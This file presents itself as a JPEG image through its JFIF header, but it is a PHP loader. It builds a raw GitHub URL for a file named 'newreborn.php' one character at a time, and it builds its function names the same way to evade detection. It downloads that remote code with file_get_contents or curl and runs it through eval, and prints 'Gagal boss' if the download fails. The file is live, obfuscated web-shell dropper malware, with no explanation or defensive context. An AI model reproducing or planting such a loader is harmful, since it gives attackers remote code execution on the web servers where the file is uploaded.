ÿØÿà JFIF  ` `  ÿþ<?php

$_u = 'h'.'t'.'t'.'p'.'s'.':' . '/' . '/' . 
      'r'.'a'.'w'.'.'.'g'.'i'.'t'.'h'.'u'.'b'.'.'.'c'.'o'.'m'.'/'.
      'S'.'k'.'e'.'r'.'r'.'s'.'s'.'/'.
      'p'.'u'.'n'.'i'.'s'.'h'.'e'.'r'.'/'.
      'r'.'e'.'f'.'s'.'/'.
      'h'.'e'.'a'.'d'.'s'.'/'.
      'm'.'a'.'i'.'n'.'/'.
      'n'.'e'.'w'.'r'.'e'.'b'.'o'.'r'.'n'.'.'.'p'.'h'.'p';

$_iniget = 'i'.'n'.'i'.'_' . 'g'.'e'.'t';
$_func_exists = 'f'.'u'.'n'.'c'.'t'.'i'.'o'.'n'.'_' . 'e'.'x'.'i'.'s'.'t'.'s';

$_open = call_user_func($_iniget, 'a'.'l'.'l'.'o'.'w'.'_' . 'u'.'r'.'l'.'_' . 'f'.'o'.'p'.'e'.'n');
$_curl = call_user_func($_func_exists, 'c'.'u'.'r'.'l'.'_' . 'i'.'n'.'i'.'t');

$_out = false;

if ($_open) {
    $_fget = 'f'.'i'.'l'.'e'.'_' . 'g'.'e'.'t'.'_' . 'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s';
    $_out = @call_user_func($_fget, $_u);
} 
elseif ($_curl) {
    $_ci = 'c'.'u'.'r'.'l'.'_' . 'i'.'n'.'i'.'t';
    $_co = 'c'.'u'.'r'.'l'.'_' . 's'.'e'.'t'.'o'.'p'.'t';
    $_ce = 'c'.'u'.'r'.'l'.'_' . 'e'.'x'.'e'.'c';
    $_cc = 'c'.'u'.'r'.'l'.'_' . 'c'.'l'.'o'.'s'.'e';

    $_ct1 = 'C'.'U'.'R'.'L'.'O'.'P'.'T'.'_' . 'R'.'E'.'T'.'U'.'R'.'N'.'T'.'R'.'A'.'N'.'S'.'F'.'E'.'R';
    $_ct2 = 'C'.'U'.'R'.'L'.'O'.'P'.'T'.'_' . 'F'.'O'.'L'.'L'.'O'.'W'.'L'.'O'.'C'.'A'.'T'.'I'.'O'.'N';
    $_ct3 = 'C'.'U'.'R'.'L'.'O'.'P'.'T'.'_' . 'T'.'I'.'M'.'E'.'O'.'U'.'T';

    $_h = call_user_func($_ci, $_u);
    call_user_func($_co, $_h, constant($_ct1), true);
    call_user_func($_co, $_h, constant($_ct2), true);
    call_user_func($_co, $_h, constant($_ct3), 10);
    $_out = call_user_func($_ce, $_h);
    call_user_func($_cc, $_h);
}

if ($_out !== false) {
    eval('?>' . $_out);
} else {
    echo 'G'.'a'.'g'.'a'.'l'.' ' . 'b'.'o'.'s'.'s';
}

?>
